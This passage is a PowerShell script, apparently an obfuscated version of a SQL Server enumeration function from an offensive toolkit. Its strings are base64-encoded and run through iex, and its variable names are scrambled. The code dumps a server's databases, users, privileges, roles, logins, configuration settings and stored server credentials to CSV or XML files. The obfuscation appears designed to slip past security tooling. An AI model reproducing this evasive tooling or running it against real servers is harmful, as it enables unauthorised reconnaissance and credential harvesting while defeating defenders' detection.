        [switch]$csv,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Crawl available SQL Server links.')]
        [switch]$CrawlLinks
    )
    Begin
    {
        if($OutFolder)
        {
            ${/=\/=\__/=\/\___/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAGgAbwAgAHQAZQBzAHQAIAA+ACAAJABPAHUAdABGAG8AbABkAGUAcgBcAHQAZQBzAHQALgB0AHgAdAA=')))
        }
        else
        {
            $OutFolder = '.'
            ${/=\/=\__/=\/\___/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAGgAbwAgAHQAZQBzAHQAIAA+ACAAJABPAHUAdABGAG8AbABkAGUAcgBcAHQAZQBzAHQALgB0AHgAdAA=')))
        }
        ${/==\__/==\/\_/\_/} = (iex -Command ${/=\/=\__/=\/\___/}) 2>&1
        if(${/==\__/==\/\_/\_/} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBkAGUAbgBpAGUAZAAuAA=='))))
        {
            Write-Host -Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABkAGUAbgBpAGUAZAAgAHQAbwAgAG8AdQB0AHAAdQB0ACAAZABpAHIAZQBjAHQAbwByAHkALgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAaQBmAGkAZQBkACAAdwByAGkAdABlACAAYQBjAGMAZQBzAHMAIAB0AG8AIABvAHUAdABwAHUAdAAgAGQAaQByAGUAYwB0AG8AcgB5AC4A')))
            ${/===\/\___/\/\/\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGwAIAAkAE8AdQB0AEYAbwBsAGQAZQByAFwAdABlAHMAdAAuAHQAeAB0AA==')))
            iex -Command ${/===\/\___/\/\/\_}
        }
    }
    Process
    {
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Return
        }
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUwBUAEEAUgBUAC4ALgAuAA==')))
        ${___/\/===\__/\__/} = $Instance.Replace('\','-').Replace(',','-')
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAG4AbwBuAC0AZABlAGYAYQB1AGwAdAAgAGQAYQB0AGEAYgBhAHMAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHUAcwBlAHIAcwAgAGYAbwByACAAZABhAHQAYQBiAGEAcwBlAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB1AHMAZQByAHMALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB1AHMAZQByAHMALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIABmAG8AcgAgAGQAYQB0AGEAYgBhAHMAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBwAHIAaQB2AGkAbABlAGcAZQBzAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBwAHIAaQB2AGkAbABlAGcAZQBzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHIAbwBsAGUAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAHMALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAHMALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHIAbwBsAGUAIABtAGUAbQBiAGUAcgBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAF8AbQBlAG0AYgBlAHIAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwByAG8AbABlAF8AbQBlAG0AYgBlAHIAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHMAYwBoAGUAbQBhAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAGMAaABlAG0AYQBzAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBzAGMAaABlAG0AYQBzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHQAZQBtAHAAIAB0AGEAYgBsAGUAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTableTemp -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAZQBtAHAAXwB0AGEAYgBsAGUAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHQAZQBtAHAAXwB0AGEAYgBsAGUAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHQAYQBiAGwAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB0AGEAYgBsAGUAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB0AGEAYgBsAGUAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAHYAaQBlAHcAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB2AGkAZQB3AHMALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwB2AGkAZQB3AHMALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGQAYQB0AGEAYgBhAHMAZQAgAGMAbwBsAHUAbQBuAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBjAG8AbAB1AG0AbgBzAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBEAGEAdABhAGIAYQBzAGUAXwBjAG8AbAB1AG0AbgBzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAbABvAGcAaQBuAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAbwBnAGkAbgBzAC4AeABtAGwA')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGwAbwBnAGkAbgBzAC4AYwBzAHYA')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAHMAZQB0AHQAaQBuAGcAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAC4ALgA=')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAcgBpAHYAaQBsAGUAZwBlAHMALgB4AG0AbAA=')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHAAcgBpAHYAaQBsAGUAZwBlAHMALgBjAHMAdgA=')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAcgBvAGwAZQBzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAcgBvAGwAZQAgAG0AZQBtAGIAZQByAHMALgAuAC4A')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAbQBlAG0AYgBlAHIAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAHIAbwBsAGUAbQBlAG0AYgBlAHIAcwAuAGMAcwB2AA==')))
            ${__/\/=\/=\/\/\_/\} | epcsv -NoTypeInformation ${_/\_/=\_/===\/\/\}
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAZQByAHYAZQByACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4ALgAuAA==')))
        ${__/\/=\/=\/\/\_/\} = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            ${_/\_/=\_/===\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABPAHUAdABGAG8AbABkAGUAcgBcACQAewBfAF8AXwAvAFwALwA9AD0APQBcAF8AXwAvAFwAXwBfAC8AfQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBTAGUAcgB2AGUAcgBfAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAHgAbQBsAA==')))
            ${__/\/=\/=\/\/\_/\} | Export-Clixml ${_/\_/=\_/===\/\/\}
        }
        else
        {
